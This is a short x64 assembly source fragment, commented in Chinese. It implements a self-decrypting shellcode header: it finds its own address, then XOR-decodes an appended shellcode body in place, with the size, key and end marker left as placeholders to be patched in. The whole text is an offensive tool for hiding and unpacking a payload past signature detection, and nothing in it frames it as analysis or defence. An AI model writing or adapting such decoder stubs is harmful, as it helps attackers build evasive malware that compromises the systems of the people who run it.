.CODE
	shell_header PROC

	call tag_ip ;获取当前RIP地址
	tag_ip:
	pop rsi  
	add rsi, 23h  ;shellcode起始位置偏移

	mov rcx, 0ffffffffffffffffh  ; shellcode大小（方便修补）
	tag_loop:
		mov al, byte ptr [rsi + rcx]
		mov rbx, 0eeeeeeeeeeeeeeeeh ;xor key
		xor al, bl
		mov byte ptr [rsi + rcx], al
	loop tag_loop

	mov rax, 123456789ABCDEF0h ;shellcode结束位置 特征码(方便定位)

	shell_header ENDP
END